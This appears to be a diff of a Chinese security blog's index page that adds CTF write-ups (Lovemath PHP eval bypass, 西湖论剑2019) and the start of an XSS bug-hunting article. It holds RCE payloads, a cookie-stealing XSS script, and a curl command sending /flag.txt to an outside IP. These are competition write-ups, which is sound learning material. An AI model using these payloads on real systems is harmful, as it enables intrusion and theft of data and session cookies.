@@ -90,74 +90,739 @@
     
         <article class="post">
             <h1>
-                <a class="title" href="/2019/07/12/page/"> 
-                    page 
+                <a class="title" href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/"> 
+                    2019国赛Web线上题目Lovemath多解WP 
                 </a>
             </h1>
                         <div class="meta">
                 <a class="date"> 
                     <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-07-12   
+                    2019-04-23   
                 </a>
                 
                 
                 
-                    
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
             </div>
             <div class="content">
                 
-                
+                <h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p>
+<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span><br><span class="line">if(!isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    $content = $_GET[&apos;c&apos;]; </span><br><span class="line">    if (strlen($content) &gt;= 80) &#123; </span><br><span class="line">        die(&quot;太长了不会算&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; </span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span><br><span class="line">    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123; </span><br><span class="line">        if (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //帮你算出答案 </span><br><span class="line">    eval(&apos;echo &apos;.$content.&apos;;&apos;); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p>
+<p>也就是说只允许Eval使用白名单的函数做字符串</p>
+<p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p>
+<p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p>
+<p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p>
+<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$input = hexdec(bin2hex(&quot;system(&apos;cat /flag&apos;);&quot;))</span><br><span class="line">$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</span><br></pre></td></tr></table></figure>
+
+<p>完整转换是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</span><br></pre></td></tr></table></figure>
+
+<p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
+<p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p>
+<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))()&#123;9&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>解码出来是<code>system(getallheaders(){9})</code></p>
+<p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p>
+<h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
+<p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>
+
                 
             </div>
             <div class="continue">
-            <a href="/2019/07/12/page/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
         
         <article class="post">
             <h1>
-                <a class="title" href="/2019/07/12/hello-world/"> 
-                    Hello World 
+                <a class="title" href="/2019/04/08/西湖论剑2019-Writeup/"> 
+                    西湖论剑2019-Writeup 
                 </a>
             </h1>
                         <div class="meta">
                 <a class="date"> 
                     <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-07-12   
+                    2019-04-08   
                 </a>
                 
                 
                 
-                    
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
             </div>
             <div class="content">
                 
-                <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+                <h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p>
+<p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p>
+<h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p>
+<p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p>
+<p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p>
+<p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p>
+<p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p>
+<p>点开hint有两个提示，</p>
+<ol>
+<li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li>
+<li>seed应该暗示着随机数/种子</li>
+</ol>
+<p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p>
+<p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p>
+<p>略脑洞。。</p>
+<h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p>
+<p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p>
+<p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p>
+<p>但是测试用js uri加载外源js不能成功，打不到cookie。</p>
+<p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p>
+<p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p>
+<p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p>
+<p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p>
+<p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl+&apos;http://50.16.48.95/&apos;+--data+&quot;`cat+/flag.txt`&quot;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p>
+<p>编码转换的exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Author:Hpdoger@d0g3</span><br><span class="line"></span><br><span class="line">html_old = &quot;javascript:var website=&apos;http://xssye/index.php&apos;;(function()&#123;(new Image()).src=website+&apos;/?keepsession=1&amp;location=&apos;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;toplocation=&apos;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;cookie=&apos;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;opener=&apos;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)());&#125;)();&quot;</span><br><span class="line"></span><br><span class="line">buffer = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for zimu in html_old:</span><br><span class="line">    zimu = ord(zimu)</span><br><span class="line">    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)</span><br><span class="line">    # print(&quot;&amp;#&quot;+zimu)</span><br><span class="line">    buffer = buffer + zimu</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p>
+<p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p>
+<p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p>
+<p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p>
+<h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p>
+<p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p>
+<p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p>
+<p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python3</span><br><span class="line"># Author: Hpdoger@d0g3</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">change_list = []</span><br><span class="line">word_list = &apos;&apos;</span><br><span class="line">zimus = &apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:</span><br><span class="line">    for ttl in file.readlines():</span><br><span class="line">        change_list.append(ttl.replace(&apos;TTL=&apos;,&apos;&apos;))</span><br><span class="line">        if len(change_list) == 4:</span><br><span class="line">            for num in change_list:</span><br><span class="line">                num = int(num)</span><br><span class="line">                a = bin(num).replace(&apos;0b&apos;,&apos;&apos;)</span><br><span class="line">                b = str(&quot;%08d&quot; % int(a))</span><br><span class="line">                infront = b[0:2]</span><br><span class="line">                word_list = word_list + infront</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            zimu = int(word_list,2)</span><br><span class="line">            zimus = zimus+chr(zimu)</span><br><span class="line">            word_list = &apos;&apos;</span><br><span class="line">            change_list.clear()</span><br><span class="line">            count = 0</span><br><span class="line"></span><br><span class="line">with open(&apos;results.txt&apos;,&apos;w&apos;) as file2:</span><br><span class="line">    file2.write(zimus)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p>
+<p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p>
+<p>拼接扫描得到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:AutomaticKey cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</span><br></pre></td></tr></table></figure>
+
+<p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>
 
                 
             </div>
             <div class="continue">
-            <a href="/2019/07/12/hello-world/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            <a href="/2019/04/08/西湖论剑2019-Writeup/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/"> 
+                    SRC挖掘初探之随缘XSS挖掘 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-04-05   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/论坛文章/">论坛文章</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p>
+<p>Author:Hpdoger@D0g3</p>
+<p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p>
+<p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p>
+<h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p>
+<p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p>
+<p>其中,getparam方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getParam: function(c_name) &#123;</span><br><span class="line">    var urlParams = location.href;</span><br><span class="line">    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€</span><br><span class="line">    if (c_start != -1) &#123;</span><br><span class="line">        c_start = c_start + c_name.length + 1;銆€</span><br><span class="line">        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);</span><br><span class="line">        if (c_end == -1) &#123;</span><br><span class="line">            c_end = urlParams.length;</span><br><span class="line">        &#125;</span><br><span class="line">        return urlParams.substring(c_start, c_end);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p>
+<p>POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cb=javascript:alert(document.cookie);//normal.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p>
+<h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p>
+<p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p>
